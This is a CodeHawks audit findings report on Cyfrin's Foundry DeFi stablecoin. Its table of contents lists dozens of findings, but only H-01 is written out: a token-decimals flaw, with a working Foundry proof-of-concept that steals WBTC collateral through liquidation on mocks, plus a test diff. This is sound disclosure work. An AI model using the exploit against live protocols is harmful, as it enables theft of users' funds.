# Foundry DeFi Stablecoin CodeHawks Audit Contest - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary-1)
- ### [Results Summary](#results-summary-1)
- ## High Risk Findings
    - [H-01. Theft of collateral tokens with fewer than 18 decimals](#h-01-theft-of-collateral-tokens-with-fewer-than-18-decimals)
    - [H-02. Liquidation Is Prevented Due To Strict Implementation of Liquidation Bonus](#h-02-liquidation-is-prevented-due-to-strict-implementation-of-liquidation-bonus)
    - [H-03. There is no incentive to liquidate small positions](#h-03-there-is-no-incentive-to-liquidate-small-positions)
    - [H-04. Business Logic: Protocol Liquidation Arithmetic](#h-04-business-logic-protocol-liquidation-arithmetic)
- ## Medium Risk Findings
    - [M-01. staleCheckLatestRoundData() does not check the status of the Arbitrum sequencer in Chainlink feeds](#m-01-stalechecklatestrounddata-does-not-check-the-status-of-the-arbitrum-sequencer-in-chainlink-feeds)
    - [M-02. DSC protocol can consume stale price data or cannot operate on some EVM chains](#m-02-dsc-protocol-can-consume-stale-price-data-or-cannot-operate-on-some-evm-chains)
    - [M-03. Chainlink oracle will return the wrong price if the aggregator hits `minAnswer`](#m-03-chainlink-oracle-will-return-the-wrong-price-if-the-aggregator-hits-minanswer)
    - [M-04. All of the USD pair price feeds doesn't have 8 decimals](#m-04-all-of-the-usd-pair-price-feeds-doesnt-have-8-decimals)
    - [M-05. Anyone can burn **DecentralizedStableCoin** tokens with `burnFrom` function](#m-05-anyone-can-burn-decentralizedstablecoin-tokens-with-burnfrom-function)
    - [M-06. Double-spending vulnerability leads to a disruption of the DSC token](#m-06-double-spending-vulnerability-leads-to-a-disruption-of-the-dsc-token)
    - [M-07. Lack of fallbacks for price feed oracle](#m-07-lack-of-fallbacks-for-price-feed-oracle)
    - [M-08. Too many DSC tokens can get minted for fee-on-transfer tokens](#m-08-too-many-dsc-tokens-can-get-minted-for-fee-on-transfer-tokens)
    - [M-09. `liquidate` does not allow the liquidator to liquidate a user if the liquidator HF < 1](#m-09-liquidate-does-not-allow-the-liquidator-to-liquidate-a-user-if-the-liquidator-hf--1)
    - [M-10. Protocol can break for a token with a proxy and implementation contract (like `TUSD`)](#m-10-protocol-can-break-for-a-token-with-a-proxy-and-implementation-contract-like-tusd)
    - [M-11. Liquidators can be front-run to their loss](#m-11-liquidators-can-be-front-run-to-their-loss)
    - [M-12. DoS of full liquidations are possible by frontrunning the liquidators](#m-12-dos-of-full-liquidations-are-possible-by-frontrunning-the-liquidators)
- ## Low Risk Findings
    - [L-01. Improving the burnDsc() to allow users to mitigate their liquidation's impact](#l-01-improving-the-burndsc-to-allow-users-to-mitigate-their-liquidations-impact)
    - [L-02. Zero address check for tokens](#l-02-zero-address-check-for-tokens)
    - [L-03. Lack of events for critical actions](#l-03-lack-of-events-for-critical-actions)
    - [L-04. Pragma isn't specified correctly which can lead to nonfunction/damaged contract when deployed on Arbitrum](#l-04-pragma-isnt-specified-correctly-which-can-lead-to-nonfunctiondamaged-contract-when-deployed-on-arbitrum)
    - [L-05. Precision loss when calculating the health factor](#l-05-precision-loss-when-calculating-the-health-factor)
    - [L-06. Unbounded Loops Found in DSCEngine.sol can lead to DoS of liquidations](#l-06-unbounded-loops-found-in-dscenginesol-can-lead-to-dos-of-liquidations)
    - [L-07. Missing Division By 0 Check](#l-07-missing-division-by-0-check)
- ## Gas Optimizations / Informationals
    - [G-01. using x=x+y /x=x-y  is more gas efficient than x+=y / x-=y](#g-01-using-xxy-xx-y-is-more-gas-efficient-than-xy--x-y)
    - [G-02. Remove unused variables in `OracleLib`](#g-02-remove-unused-variables-in-oraclelib)
    - [G-03. Use constants instead of `type(uint256).max`](#g-03-use-constants-instead-of-typeuint256max)
    - [G-04. Double checks](#g-04-double-checks)
    - [G-05. `DSCEngine` should deploy its own `DecentralizedStableCoin`](#g-05-dscengine-should-deploy-its-own-decentralizedstablecoin)
    - [G-06. `burn()` and `staleCheckLatestRoundData()` and `getTimeout()` can be `external`](#g-06-burn-and-stalechecklatestrounddata-and-gettimeout-can-be-external)
    - [G-07. Replace OZ's library with Solmate to save gas](#g-07-replace-ozs-library-with-solmate-to-save-gas)
    - [G-08. Use `==` instead for `<=` for `uints` when comparing for `zero` values](#g-08-use--instead-for--for-uints-when-comparing-for-zero-values)
    - [G-09. # `_burnDsc` function on `DSCEngine` can be simplified](#g-09--_burndsc-function-on-dscengine-can-be-simplified)
    - [G-10. `Ownable` and `ERC20Burneable` implementations arent necessary in `DecentralizedStableCoin`](#g-10-ownable-and-erc20burneable-implementations-arent-necessary-in-decentralizedstablecoin)
    - [G-11. `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops](#g-11-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops)
    - [G-12. No amountCollateral > balance check](#g-12-no-amountcollateral--balance-check)
    - [G-13. Constants should be used for hardcoded values](#g-13-constants-should-be-used-for-hardcoded-values)
    - [G-14. [L-02] It is not specified which token is not allowed ](#g-14-l-02-it-is-not-specified-which-token-is-not-allowed)
    - [G-15. DSC Mint will either return true or revert, thus checking `minted` status in `mintDcs` is unnecessary](#g-15-dsc-mint-will-either-return-true-or-revert-thus-checking-minted-status-in-mintdcs-is-unnecessary)
    - [G-16. Spelling errors](#g-16-spelling-errors)
    - [G-17. Non Critical Issues：Discrepancy between code and comments](#g-17-non-critical-issuesdiscrepancy-between-code-and-comments)
    - [G-18. The nonReentrant modifier should occur before all other modifiers](#g-18-the-nonreentrant-modifier-should-occur-before-all-other-modifiers)
    - [G-19. Underscore function arguments ](#g-19-underscore-function-arguments)
    - [G-20. Better Consistently Named Custom Errors ](#g-20-better-consistently-named-custom-errors)
    - [G-21. Combine Multiple Mapping Address](#g-21-combine-multiple-mapping-address)
    - [G-22. [G-01] - Use `do-while` loop instead of `for-loop` to save users gas cost.](#g-22-g-01---use-do-while-loop-instead-of-for-loop-to-save-users-gas-cost)
    - [G-23. Redundant check for transfer success](#g-23-redundant-check-for-transfer-success)
    - [G-24. Misleading comment in DSCEngine._healthFactor](#g-24-misleading-comment-in-dscengine_healthfactor)
    - [G-25. Prefer array assignment over pushing elements in for-loops](#g-25-prefer-array-assignment-over-pushing-elements-in-for-loops)
    - [G-26. [I-1] NatSpec `@param` is missing](#g-26-i-1-natspec-param-is-missing)
    - [G-27. NatSpec `@return` argument is missing](#g-27-natspec-return-argument-is-missing)
    - [G-28. [I-4] Constants in comparisons should appear on the left side](#g-28-i-4-constants-in-comparisons-should-appear-on-the-left-side)
    - [G-29. [I-10] Functions not used internally could be marked external](#g-29-i-10-functions-not-used-internally-could-be-marked-external)
    - [G-30. Use `assembly` to check for `address(0)`](#g-30-use-assembly-to-check-for-address0)
    - [G-31. Misleading NatSpec for redeemCollateral function](#g-31-misleading-natspec-for-redeemcollateral-function)
    - [G-32. Use hardcode address instead address(this)](#g-32-use-hardcode-address-instead-addressthis)
    - [G-33. Using `nonReentrant` when it's unnecessary](#g-33-using-nonreentrant-when-its-unnecessary)
    - [G-34. Improve the error being thrown](#g-34-improve-the-error-being-thrown)
    - [G-35. More documentation is preferred](#g-35-more-documentation-is-preferred)
    - [G-36. Imports could be organized more systematically](#g-36-imports-could-be-organized-more-systematically)
    - [G-37. Unnecessary argument in getTimeout function](#g-37-unnecessary-argument-in-gettimeout-function)
    - [G-38. Not respecting the Checks-Effects-Interactions pattern that can be a place for bugs](#g-38-not-respecting-the-checks-effects-interactions-pattern-that-can-be-a-place-for-bugs)
    - [G-39. >= costs less gas than >](#g-39--costs-less-gas-than-)
    - [G-40. [L-03] Continues with the standard use for Collateral variable](#g-40-l-03-continues-with-the-standard-use-for-collateral-variable)
    - [G-41. Wrong comment DecentralizedStableCoin.sol](#g-41-wrong-comment-decentralizedstablecoinsol)
    - [G-42. Consider disabling renounceOwnership()](#g-42-consider-disabling-renounceownership)
    - [G-43. Boolean equality](#g-43-boolean-equality)
    - [G-44. Amounts should be checked for `0` before calling a `transfer`](#g-44-amounts-should-be-checked-for-0-before-calling-a-transfer)
    - [G-45. collateral and debt to cover not validated](#g-45-collateral-and-debt-to-cover-not-validated)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: Cyfrin

### Dates: Jul 24th, 2023 - Aug 5th, 2023

[See more contest details here](https://www.codehawks.com/contests/cljx3b9390009liqwuedkn0m0)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 4
   - Medium: 12
   - Low: 7
  - Gas/Info: 45

# High Risk Findings

## <a id='H-01'></a>H-01. Theft of collateral tokens with fewer than 18 decimals

_Submitted by [kutu](/profile/clk7qwwzw001gm9088xsr6a22), [Bobface](/profile/clk572bex000wl5082nhslxbq), [JohnnyTime](/profile/clk6vuje90014mm0800cqeo8w), [Vagner](/profile/clk86c7nq0000l7083fdvyndc), [HollaDieWaldfee](/profile/clk80nhp8000km908ew0a2ccy), [0xyPhilic](/profile/clk3wry0p0008mf08lbxjpcks), [jnrlouis](/profile/clk4myztd0000l408kiebyflx), [JohnLaw](/profile/clk4b3vtt001ald08ew8go29n), [gaslimit](/profile/clk97ur9y0000mm08aol3pviu), [rvierdiiev](/profile/clk48xt1x005yl50815kr7bpc), [pengun](/profile/clkkjed3v0004mj08gpw0u7b2), [toshii](/profile/clkkffr6v0008mm0866fnnu0a), [0xANJAN143](/profile/clkceki4c0000lb0808bk9imq), [mahyar](/profile/clkpvim480008l408w11mlv63), [TeamFliBit](/team/clki07mfj0001la08ctbacja0), [BenRai](/profile/clkksmnp8000sla08ob285wxl), [said017](/profile/clk3uzcop000ilb08pak3rnii), [RugpullDetector](/profile/clknpmzwp0014l608wk9hflu6), [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5), [pep7siup](/profile/clktaa8x50014mi08472cywse), [AlexCzm](/profile/clk7gew0m000gmi08sgbhts35), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [warRoom](/team/clkuq3mcw0001ju08fzp9y8bi), [SBSecurity](/team/clkuz8xt7001vl608nphmevro), [gss1](/profile/clki09vec000cla08u2o9reem), [No12Samurai](/profile/clk7mu64b000cme08wadtt1f6), [Juntao](/profile/clk86te0j000clh088i2uxcdh), [Crunch](/profile/clkttcnnz0014md08gh21vj4w), [aak](/profile/clk9kvsmw000aih08ru3t39en), [CircleLooper](/profile/clkvzob0p0000mc081440qgvp), [kamui](/profile/clk8h2bxd000sia08o8nz21g2), [maanas](/profile/clkrry2zj001cjm08l5m222l6), [BLACK PANDA REACH](/team/clkgk6w82000djx09cwpz55ro), [0xgrbr](/profile/clksi7blx001cl408pp5nmnpa), [paspe](/profile/clkbfdreo000ajo08lhhqgppp), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [Kose](/profile/clk3whc2g0000mg08zp13lp1p), [honeymewn](/profile/clk4hhuqi0008mk08x47ah4w4), [cuthalion0x](/profile/clk43656v008cmb081faosv4x), [alexzoid](/profile/clk41t0lv006kla08p69ueiel), [JMTT](/profile/clkwqqxzg000ol508oo61jf65). Selected submission by: [cuthalion0x](/profile/clk43656v008cmb081faosv4x)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L347

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L366

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L356

## Summary
The token prices computed by `DSCEngine#getTokenAmountFromUsd()` and `DSCEngine#getUsdValue()` fail to account for token decimals. As written, these methods assume that all tokens have 18 decimals; however, one of the stated collateral tokens is `WBTC`, which has only 8 decimals on Ethereum mainnet.

This 18-decimal assumption creates a discrepancy between the protocol-computed USD value and actual USD value of tokens with non-standard decimals. As a result, any deposited collateral token with fewer than 18 decimals (including `WBTC`) can potentially be stolen by an attacker.

## Vulnerability Details
This line from `DSCEngine#getTokenAmountFromUsd()` contains scaling adjustments for the price feed's own precision (expressed to 8 decimals), but no such adjustments for the token's own decimals. The return value always has 18 decimals, but it should instead match the token's decimals since it returns a token amount.
```solidity
return (usdAmountInWei * PRECISION) / (uint256(price) * ADDITIONAL_FEED_PRECISION);
```

This line from `DSCEngine#getUsdValue()` contains the same issue but in the opposite direction. The return value always has the same number of decimals as the token itself, whereas it is supposed to be an 18-decimal USD amount.
```solidity
return ((uint256(price) * ADDITIONAL_FEED_PRECISION) * amount) / PRECISION;
```

When various USD values are added together in this line from `DSCEngine#getAccountCollateralValue()`, the total collateral value is incorrect because the terms of the sum may have different decimals, and therefore different frames of reference.
```solidity
totalCollateralValueInUsd += getUsdValue(token, amount);
```

A proof of concept for the attack is provided below. Note that this test utilizes the slightly modified version of `HelperConfig.s.sol` shown in the diff at the bottom of this submission, which creates mock tokens with differing decimals.
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import {DeployDSC} from "../../script/DeployDSC.s.sol";
import {DSCEngine} from "../../src/DSCEngine.sol";
import {DecentralizedStableCoin} from "../../src/DecentralizedStableCoin.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {ERC20DecimalsMock} from "@openzeppelin/contracts/mocks/ERC20DecimalsMock.sol";
import {MockV3Aggregator} from "../mocks/MockV3Aggregator.sol";
import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";

contract TokenDecimalExploit is StdCheats, Test {
    DSCEngine public dsce;
    DecentralizedStableCoin public dsc;
    HelperConfig public helperConfig;

    address public ethUsdPriceFeed;
    address public btcUsdPriceFeed;
    address public weth;
    address public wbtc;
    uint256 public wethDecimals;
    uint256 public wbtcDecimals;
    uint256 public feedDecimals;
    uint256 public deployerKey;

    address public user = address(1);
    address public exploiter = address(2);

    uint256 public constant STARTING_USER_BALANCE = 10 ether;
    uint256 public constant MIN_HEALTH_FACTOR = 1e18;
    uint256 public constant LIQUIDATION_BONUS = 10;
    uint256 public constant LIQUIDATION_THRESHOLD = 50;
    uint256 public constant LIQUIDATION_PRECISION = 100;

    function setUp() external {
        DeployDSC deployer = new DeployDSC();
        (dsc, dsce, helperConfig) = deployer.run();
        (ethUsdPriceFeed, btcUsdPriceFeed, weth, wbtc, deployerKey) = helperConfig.activeNetworkConfig();
        if (block.chainid == 31337) {
            vm.deal(user, STARTING_USER_BALANCE);
        }
        ERC20DecimalsMock(weth).mint(user, STARTING_USER_BALANCE);
        ERC20DecimalsMock(wbtc).mint(user, STARTING_USER_BALANCE);
        ERC20DecimalsMock(weth).mint(exploiter, STARTING_USER_BALANCE);
        // The exploiter is not given any WBTC.

        wethDecimals = ERC20DecimalsMock(weth).decimals();
        wbtcDecimals = ERC20DecimalsMock(wbtc).decimals();
        feedDecimals = helperConfig.FEED_DECIMALS();
    }

    /**
     * @notice This test is based on a very real possible scenario involving WETH and WBTC.
     *
     * On Ethereum mainnet, WETH and WBTC have 18 and 8 decimals, respectively.
     * The current prices of WETH and WBTC are close to $2,000 and $30,000, respectively.
     * The `DSCEngine` allows a user to borrow up to the liquidation threshold.
     * The `DSCEngine` fails to account for token decimals when computing USD prices.
     */ 
    function testExploitTokenDecimals() public {
        // Set initial prices.
        MockV3Aggregator(ethUsdPriceFeed).updateAnswer(int256(2_000 * 10**feedDecimals)); // $2,000
        MockV3Aggregator(btcUsdPriceFeed).updateAnswer(int256(30_000 * 10**feedDecimals)); // $30,000

        // A user borrows the maximum possible amount of DSC using WETH as collateral.
        vm.startPrank(user);
        uint256 amountWethDeposited = 1 * 10**wethDecimals; // 1 WETH
        uint256 expectedValueWeth = 2_000 ether; // $2,000
        uint256 amountDscFromWeth = (expectedValueWeth * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
        ERC20DecimalsMock(weth).approve(address(dsce), amountWethDeposited);
        dsce.depositCollateralAndMintDsc(weth, amountWethDeposited, amountDscFromWeth);
        assertEq(dsc.balanceOf(user), amountDscFromWeth);
        vm.stopPrank();

        // The user's 1 WETH should be worth $2,000 as we expect.
        uint256 valueWeth = dsce.getUsdValue(weth, amountWethDeposited);
        assertEq(valueWeth, expectedValueWeth);

        // Similarly, the reciprocal is true.
        uint256 amountWeth = dsce.getTokenAmountFromUsd(weth, expectedValueWeth);
        assertEq(amountWeth, amountWethDeposited);

        // Now the user borrows more DSC using WBTC collateral.
        // The flawed price computation ensures that the user can't borrow much at all, but they will anyway.
        vm.startPrank(user);
        uint256 amountWbtcDeposited = 1 * 10**wbtcDecimals; // 1 WBTC
        // This is the flaw! Given WBTC's 8 decimals, this WBTC is priced at $0.000003 instead of $30,000.
        uint256 expectedValueWbtc = 30_000 * 10**wbtcDecimals; // $0.000003 != $30,000
        uint256 amountDscFromWbtc = (expectedValueWbtc * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
        ERC20DecimalsMock(wbtc).approve(address(dsce), amountWbtcDeposited);
        dsce.depositCollateralAndMintDsc(wbtc, amountWbtcDeposited, amountDscFromWbtc);
        assertEq(dsc.balanceOf(user), amountDscFromWeth + amountDscFromWbtc);
        vm.stopPrank();

        // The user's 1 WBTC is worth far too little.
        uint256 valueWbtc = dsce.getUsdValue(wbtc, amountWbtcDeposited);
        assertEq(valueWbtc, expectedValueWbtc);

        // Similarly, the reciprocal is true.
        uint256 amountWbtc = dsce.getTokenAmountFromUsd(wbtc, expectedValueWbtc);
        assertEq(amountWbtc, amountWbtcDeposited);

        // An exploiter acquires DSC to perform a liquidation (DSC could have come from the market, but we borrow it).
        vm.startPrank(exploiter);
        ERC20DecimalsMock(weth).approve(address(dsce), amountWethDeposited);
        dsce.depositCollateralAndMintDsc(weth, amountWethDeposited, amountDscFromWeth);
        assertEq(dsc.balanceOf(exploiter), amountDscFromWeth);
        vm.stopPrank();

        // Over time, the price of WBTC falls just slightly. The user is now vulnerable to liquidation.
        MockV3Aggregator(btcUsdPriceFeed).updateAnswer(int256(29_999 * 10**feedDecimals)); // $29,999
        uint256 newValueWbtc = dsce.getUsdValue(wbtc, amountWbtcDeposited);
        assertTrue(dsce.getHealthFactor(user) < MIN_HEALTH_FACTOR);

        // The exploiter liquidates the user's WBTC by paying back an "equivalent" amount of DSC.
        // The amount is actually far too low given the flawed price calculation.
        // After this, the exploiter still has plenty of DSC and all of the user's WBTC.
        // The exploiter paid ~$0.0000027 for ~$30,000 worth of WBTC.
        vm.startPrank(exploiter);
        // This comes out to about $0.0000027 (reduced from $0.000003 to account for 10% liquidation bonus)
        uint256 debtToPay = (newValueWbtc * LIQUIDATION_PRECISION) / (LIQUIDATION_PRECISION + LIQUIDATION_BONUS);
        dsc.approve(address(dsce), debtToPay);
        dsce.liquidate(wbtc, user, debtToPay);
        vm.stopPrank();
        
        // Exploiter has all of the WBTC and still lots of DSC left!
        uint256 err = 0.0001 ether; // 0.01% allowable relative error to account for rounding
        assertApproxEqRel(ERC20DecimalsMock(wbtc).balanceOf(exploiter), amountWbtcDeposited, err);
        assertApproxEqRel(dsc.balanceOf(exploiter), amountDscFromWeth, err);

        // User has no WBTC left in the `DSCEngine`.
        assertApproxEqAbs(dsce.getCollateralBalanceOfUser(user, wbtc), 0, 1); // 1 wei of allowable error for rounding
    }
}
```

## Impact
Direct theft of deposited collateral for tokens with fewer than 18 decimals.

## Tools Used
Manual review.

## Recommendations
Test for varied token decimals! Here is a diff which adds some relevant tests to the existing code base. Note that the new tests fail!

```diff
diff --git a/script/HelperConfig.s.sol b/script/HelperConfig.s.sol
index c9083ad..98c2b56 100644
--- a/script/HelperConfig.s.sol
+++ b/script/HelperConfig.s.sol
@@ -4,7 +4,7 @@ pragma solidity ^0.8.18;
 
 import {Script} from "forge-std/Script.sol";
 import {MockV3Aggregator} from "../test/mocks/MockV3Aggregator.sol";
-import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
+import {ERC20DecimalsMock} from "@openzeppelin/contracts/mocks/ERC20DecimalsMock.sol";
 
 contract HelperConfig is Script {
     struct NetworkConfig {
@@ -15,7 +15,9 @@ contract HelperConfig is Script {
         uint256 deployerKey;
     }
 
-    uint8 public constant DECIMALS = 8;
+    uint8 public constant FEED_DECIMALS = 8;
+    uint8 public constant WETH_DECIMALS = 18;
+    uint8 public constant WBTC_DECIMALS = 8;
     int256 public constant ETH_USD_PRICE = 2000e8;
     int256 public constant BTC_USD_PRICE = 1000e8;
     uint256 public DEFAULT_ANVIL_KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
@@ -47,16 +49,18 @@ contract HelperConfig is Script {
 
         vm.startBroadcast();
         MockV3Aggregator ethUsdPriceFeed = new MockV3Aggregator(
-            DECIMALS,
+            FEED_DECIMALS,
             ETH_USD_PRICE
         );
-        ERC20Mock wethMock = new ERC20Mock("WETH", "WETH", msg.sender, 1000e8);
+        ERC20DecimalsMock wethMock = new ERC20DecimalsMock("WETH", "WETH", WETH_DECIMALS);
+        wethMock.mint(msg.sender, 1000 * 10**WETH_DECIMALS);
 
         MockV3Aggregator btcUsdPriceFeed = new MockV3Aggregator(
-            DECIMALS,
+            FEED_DECIMALS,
             BTC_USD_PRICE
         );
-        ERC20Mock wbtcMock = new ERC20Mock("WBTC", "WBTC", msg.sender, 1000e8);
+        ERC20DecimalsMock wbtcMock = new ERC20DecimalsMock("WBTC", "WBTC", WBTC_DECIMALS);
+        wbtcMock.mint(msg.sender, 1000 * 10**WBTC_DECIMALS);
         vm.stopBroadcast();
 
         return NetworkConfig({
diff --git a/test/unit/DSCEngineTest.t.sol b/test/unit/DSCEngineTest.t.sol
index f697f8d..dc2de7d 100644
--- a/test/unit/DSCEngineTest.t.sol
+++ b/test/unit/DSCEngineTest.t.sol
@@ -6,7 +6,7 @@ import {DeployDSC} from "../../script/DeployDSC.s.sol";
 import {DSCEngine} from "../../src/DSCEngine.sol";
 import {DecentralizedStableCoin} from "../../src/DecentralizedStableCoin.sol";
 import {HelperConfig} from "../../script/HelperConfig.s.sol";
-import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
+import {ERC20DecimalsMock} from "@openzeppelin/contracts/mocks/ERC20DecimalsMock.sol";
 import {MockMoreDebtDSC} from "../mocks/MockMoreDebtDSC.sol";
 import {MockFailedMintDSC} from "../mocks/MockFailedMintDSC.sol";
 import {MockFailedTransferFrom} from "../mocks/MockFailedTransferFrom.sol";
@@ -24,6 +24,8 @@ contract DSCEngineTest is StdCheats, Test {
     address public btcUsdPriceFeed;
     address public weth;
     address public wbtc;
+    uint256 public wethDecimals;
+    uint256 public wbtcDecimals;
     uint256 public deployerKey;
 
     uint256 amountCollateral = 10 ether;
@@ -58,8 +60,11 @@ contract DSCEngineTest is StdCheats, Test {
         //     vm.etch(ethUsdPriceFeed, address(aggregatorMock).code);
         //     vm.etch(btcUsdPriceFeed, address(aggregatorMock).code);
         // }
-        ERC20Mock(weth).mint(user, STARTING_USER_BALANCE);
-        ERC20Mock(wbtc).mint(user, STARTING_USER_BALANCE);
+        ERC20DecimalsMock(weth).mint(user, STARTING_USER_BALANCE);
+        ERC20DecimalsMock(wbtc).mint(user, STARTING_USER_BALANCE);
+
+        wethDecimals = ERC20DecimalsMock(weth).decimals();
+        wbtcDecimals = ERC20DecimalsMock(wbtc).decimals();
     }
 
     ///////////////////////
@@ -81,21 +86,36 @@ contract DSCEngineTest is StdCheats, Test {
     // Price Tests //
     //////////////////
 
-    function testGetTokenAmountFromUsd() public {
-        // If we want $100 of WETH @ $2000/WETH, that would be 0.05 WETH
-        uint256 expectedWeth = 0.05 ether;
-        uint256 amountWeth = dsce.getTokenAmountFromUsd(weth, 100 ether);
+    function testGetWethTokenAmountFromUsd() public {
+        // If we want $10,000 of WETH @ $2000/WETH, that would be 5 WETH
+        uint256 expectedWeth = 5 * 10**wethDecimals;
+        uint256 amountWeth = dsce.getTokenAmountFromUsd(weth, 10_000 ether);
         assertEq(amountWeth, expectedWeth);
     }
 
-    function testGetUsdValue() public {
-        uint256 ethAmount = 15e18;
-        // 15e18 ETH * $2000/ETH = $30,000e18
-        uint256 expectedUsd = 30000e18;
+    function testGetWbtcTokenAmountFromUsd() public {
+        // If we want $10,000 of WBTC @ $1000/WBTC, that would be 10 WBTC
+        uint256 expectedWbtc = 10 * 10**wbtcDecimals;
+        uint256 amountWbtc = dsce.getTokenAmountFromUsd(wbtc, 10_000 ether);
+        assertEq(amountWbtc, expectedWbtc);
+    }
+
+    function testGetUsdValueWeth() public {
+        uint256 ethAmount = 15 * 10**wethDecimals;
+        // 15 ETH * $2000/ETH = $30,000
+        uint256 expectedUsd = 30_000 ether;
         uint256 usdValue = dsce.getUsdValue(weth, ethAmount);
         assertEq(usdValue, expectedUsd);
     }
 
+    function testGetUsdValueWbtc() public {
+        uint256 btcAmount = 15 * 10**wbtcDecimals;
+        // 15 BTC * $1000/BTC = $15,000
+        uint256 expectedUsd = 15_000 ether;
+        uint256 usdValue = dsce.getUsdValue(wbtc, btcAmount);
+        assertEq(usdValue, expectedUsd);
+    }
+
     ///////////////////////////////////////
     // depositCollateral Tests //
     ///////////////////////////////////////
@@ -119,7 +139,7 @@ contract DSCEngineTest is StdCheats, Test {
         mockDsc.transferOwnership(address(mockDsce));
         // Arrange - User
         vm.startPrank(user);
-        ERC20Mock(address(mockDsc)).approve(address(mockDsce), amountCollateral);
+        ERC20DecimalsMock(address(mockDsc)).approve(address(mockDsce), amountCollateral);
         // Act / Assert
         vm.expectRevert(DSCEngine.DSCEngine__TransferFailed.selector);
         mockDsce.depositCollateral(address(mockDsc), amountCollateral);
@@ -128,7 +148,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testRevertsIfCollateralZero() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
 
         vm.expectRevert(DSCEngine.DSCEngine__NeedsMoreThanZero.selector);
         dsce.depositCollateral(weth, 0);
@@ -136,7 +156,8 @@ contract DSCEngineTest is StdCheats, Test {
     }
 
     function testRevertsWithUnapprovedCollateral() public {
-        ERC20Mock randToken = new ERC20Mock("RAN", "RAN", user, 100e18);
+        ERC20DecimalsMock randToken = new ERC20DecimalsMock("RAN", "RAN", 4);
+        ERC20DecimalsMock(randToken).mint(user, 100 ether);
         vm.startPrank(user);
         vm.expectRevert(DSCEngine.DSCEngine__NotAllowedToken.selector);
         dsce.depositCollateral(address(randToken), amountCollateral);
@@ -145,7 +166,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     modifier depositedCollateral() {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateral(weth, amountCollateral);
         vm.stopPrank();
         _;
@@ -182,7 +203,7 @@ contract DSCEngineTest is StdCheats, Test {
         mockDsc.transferOwnership(address(mockDsce));
         // Arrange - User
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(mockDsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(mockDsce), amountCollateral);
 
         vm.expectRevert(DSCEngine.DSCEngine__MintFailed.selector);
         mockDsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
@@ -193,7 +214,7 @@ contract DSCEngineTest is StdCheats, Test {
         (, int256 price,,,) = MockV3Aggregator(ethUsdPriceFeed).latestRoundData();
         amountToMint = (amountCollateral * (uint256(price) * dsce.getAdditionalFeedPrecision())) / dsce.getPrecision();
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
 
         uint256 expectedHealthFactor =
             dsce.calculateHealthFactor(dsce.getUsdValue(weth, amountCollateral), amountToMint);
@@ -204,7 +225,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     modifier depositedCollateralAndMintedDsc() {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.stopPrank();
         _;
@@ -221,7 +242,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testRevertsIfMintAmountIsZero() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.expectRevert(DSCEngine.DSCEngine__NeedsMoreThanZero.selector);
         dsce.mintDsc(0);
@@ -235,7 +256,7 @@ contract DSCEngineTest is StdCheats, Test {
         amountToMint = (amountCollateral * (uint256(price) * dsce.getAdditionalFeedPrecision())) / dsce.getPrecision();
 
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateral(weth, amountCollateral);
 
         uint256 expectedHealthFactor =
@@ -259,7 +280,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testRevertsIfBurnAmountIsZero() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.expectRevert(DSCEngine.DSCEngine__NeedsMoreThanZero.selector);
         dsce.burnDsc(0);
